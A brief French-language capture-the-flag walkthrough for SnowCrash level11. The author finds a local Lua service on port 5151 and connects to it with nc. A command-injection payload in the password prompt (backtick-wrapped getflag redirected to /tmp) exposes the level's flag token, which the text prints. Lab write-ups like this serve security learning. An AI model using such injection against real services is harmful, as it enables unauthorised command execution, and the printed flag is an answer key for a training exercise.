ls -la
on trouve un ex level11.lua
je le cat et je vois qu'il utilise un server:
"127.0.0.1", 5151

premier chose qui me vient tester avec un nc

nc 127.0.0.1 5151
il me demande un password
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: qwer
Erf nope..

imaginon c comme les premier flag si il a un echo qui dit getflag ca peut marcher
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: echo getflag
Erf nope..

je vais essayer d'envoyer le retour dans un fichier
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: echo `getflag` > /tmp/test2
Erf nope..

level11@SnowCrash:~$ cat /tmp/test2
echo Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

le echo n'etait pas obligatoir mais YES